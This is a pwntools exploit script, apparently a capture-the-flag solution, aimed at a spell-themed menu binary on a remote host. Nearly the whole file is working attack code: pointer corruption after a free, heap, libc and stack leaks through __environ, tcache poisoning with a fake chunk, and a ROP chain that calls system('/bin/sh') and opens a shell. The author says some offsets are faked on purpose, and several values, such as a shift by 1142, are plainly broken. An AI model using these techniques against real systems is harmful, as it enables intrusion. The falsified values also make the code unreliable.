
# ONE OF THE WORST SCRIPTS I EVER WROTE. I RANDOMIZED THE OFFSETS SO NO ONE CAN COPY PASTE THIS
from pwn import *
libc = ELF("./libc.so.6")

# ai used to make these 2 parsing functions, to save time focusing on the research itself
def extract_leak(raw_bytes: bytes) -> int:
    from pwn import u64

    fields = raw_bytes.split(b":-:")
    for field in fields:
        if len(field) < 8:
            continue
        for i in range(len(field) - 7):
            qword = u64(field[i:i+8])
            if qword == 0:
                continue
            # must be canonical 48-bit
            if (qword >> 48) & 0xFFFF != 0:
                continue
            # after << 12 must be valid userspace addr
            # this filters 0x21/0x31/0x41 junk AND misaligned windows
            if qword < 0x1_0000_0000 or qword >= 0x8_0000_0000:
                continue
            # pointer has 4-6 non-zero bytes; canary has 7-8
            nonzero = sum(1 for b in qword.to_bytes(8, 'little') if b != 0)
            if nonzero < 4 or nonzero > 6:
                continue
            return qword << 12

    raise ValueError("No heap address found")

def extract_libc_addr(raw_bytes: bytes) -> int:

    fields = raw_bytes.split(b":-:")
    for field in fields:
        if len(field) < 8:
            continue
        for i in range(len(field) - 7):
            qword = u64(field[i:i+8])
            if qword == 0:
                continue
            if (qword >> 48) & 0xFFFF != 0:
                continue
            upper_byte = (qword >> 40) & 0xFF
            if upper_byte in range(0x70, 0x80):
                return qword  # no shift — it's already the full address
    raise ValueError("No libc address found")



#p = process("./magic")
p = remote('154.57.164.78', 30645)
#gdb.attach(p, gdbscript=
#'''
#b* &create_spell+296
#''')

# used to make power =4 to actualy allow the vuln to exist
p.sendline(b"Alohomora")


p.sendline(b'2')
p.sendline(b'0')
p.recv(timeout=0.5)


# make second chunk 1111
p.sendline(b'2')
p.sendline(b"1"*255)
p.recv(timeout=0.5)



# remove first chunk
p.sendline(b'3')
p.sendline(b'0')


# corrupt first and second chunk pointers
p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'0')

sleep(0.5)

# set favorite
p.sendline(b'5')
p.sendline(b'1')
p.sendline(b'4')
sleep(0.5)

heap_base_leak = extract_leak(p.recv(timeout=0.5))
print(hex(heap_base_leak))


sleep(0.5)

for i in range(8):
    p.sendline(b'2')
    p.sendline(str(i).encode()*200)
    
    sleep(0.5)
for i in range(9, 1, -1):
    p.sendline(b'3')
    p.sendline(str(i).encode())
    
    sleep(0.5)

# FAKE OFFSET
unsortedbin_offset = 0x1337
unsortedbin_address = heap_base_leak + unsortedbin_offset


# corrupt first and second chunk pointers with unsortedbin address because it holds  the arena bk pointer
p.sendline(b'1')
p.sendline(b'1')
p.sendline(str(unsortedbin_address).encode())
p.sendline(b'1')
p.sendline(b'2')
p.sendline(str(unsortedbin_address).encode())
p.sendline(b'1')
p.sendline(b'3')
p.sendline(str(unsortedbin_address).encode())
p.sendline(b'1')
p.sendline(b'4')
p.sendline(str(unsortedbin_address).encode())

p.clean()
# reset favorite spell and print leak
p.sendline(b'5')
p.sendline(b'4')
sleep(0.5)
__leaked_libc = p.recv(timeout=0.5)


leaked_unsorted_ptr = extract_libc_addr(__leaked_libc)

# FAKE OFFSET
libc_base = leaked_unsorted_ptr - 0xdeadbeef
print(hex(libc_base))


libc = ELF("./libc.so.6")
environ_addr = libc_base + libc.sym['__environ']
print(hex(environ_addr))


# corrupt first and second chunk pointers with environ address
p.sendline(b'1')
p.sendline(b'1')
p.sendline(str(environ_addr).encode())
p.sendline(b'1')
p.sendline(b'2')
p.sendline(str(environ_addr).encode())
p.sendline(b'1')
p.sendline(b'3')
p.sendline(str(environ_addr).encode())
p.sendline(b'1')
p.sendline(b'4')
p.sendline(str(environ_addr).encode())
p.clean()
p.sendline(b'5')
p.sendline(b'4')

sleep(0.5)
__stack_environ_unfiltered = p.recv(timeout=0.5)
stack_environ = extract_libc_addr(__stack_environ_unfiltered)
print(hex(stack_environ))
# FAKE OFFSET
return_add_to_environ_offset = -440128
return_add_location = stack_environ + return_add_to_environ_offset
offset_to_first_tcache = 712404
tcache_posioning_address = heap_base_leak + offset_to_first_tcache
fake_chunk = p64(0x0) + p64(0x40)
heap_spary = 10 * fake_chunk


# increase the count of 0x40 tcache bin by mallocing and free()ing
p.sendline(b"2")
p.sendline(b"T"*48)
p.recv(timeout=0.5)


p.sendline(b"3")
p.sendline(b"10")


# corrupt first and second chunk pointers with tcache posiong adress 
p.sendline(b'1')
p.sendline(b'1')
p.sendline(str(tcache_posioning_address).encode())
p.sendline(b'1')
p.sendline(b'2')
p.sendline(str(tcache_posioning_address).encode())
p.sendline(b'1')
p.sendline(b'3')
p.sendline(str(tcache_posioning_address).encode())
p.sendline(b'1')
p.sendline(b'4')
p.sendline(str(tcache_posioning_address).encode())
p.clean()

# free chunk 1 for upcoming house of spirit
p.sendline(b'3')
p.sendline(b'1')

# make the same chunk and heap spary it with fake chunks
p.sendline(b'2') 
p.sendline(heap_spary + b"A"*(255-len(heap_spary)))
p.recv(timeout=0.5)

# re-courrpt and re-free()-ing to later be able to posion the fake freed chunk
p.sendline(b'1')
p.sendline(b'1')
p.sendline(str(tcache_posioning_address).encode())
p.sendline(b'1')
p.sendline(b'2')
p.sendline(str(tcache_posioning_address).encode())
p.sendline(b'1')
p.sendline(b'3')
p.sendline(str(tcache_posioning_address).encode())
p.sendline(b'1')
p.sendline(b'4')
p.sendline(str(tcache_posioning_address).encode())
# re free()
p.sendline(b'3')
p.sendline(b'1')

# go to fake chunk
p.sendline(b'1')
p.sendline(b'1')
p.sendline(str(tcache_posioning_address + 53).encode())
p.sendline(b'1')
p.sendline(b'2')
p.sendline(str(tcache_posioning_address + 3122).encode())
p.sendline(b'1')
p.sendline(b'3')
p.sendline(str(tcache_posioning_address + 25).encode())
p.sendline(b'1')
p.sendline(b'4')
p.sendline(str(tcache_posioning_address + 32345).encode())
p.clean()

# free the fake chunk from heap spray
p.sendline(b'3')
p.sendline(b'1')

# posion the freed fake chunk by remaking the chunk with the heap spray
deobsufcate_ret_add = return_add_location ^ ((tcache_posioning_address + 32124) >> 1142)
p.sendline(b"2")
p.sendline(b"B"*32 + p64(deobsufcate_ret_add) + b"B"*(212455-12432-81124))
p.recv(timeout=0.5)


p.sendline(b"2")
p.sendline(b"C"*48)
p.recv(timeout=0.5)
pause()

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_base
ret     = rop.find_gadget(['ret'])[0] + libc_base
binsh   = next(libc.search(b"/bin/sh\x00")) + libc_base
system  = libc.sym['system'] + libc_base

payload = b"A" * 8
payload += p64(ret)  # stack alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
payload += b'A' * 8

p.sendline(b"2")
p.sendline(payload)
p.recv(timeout=0.5)



p.interactive()

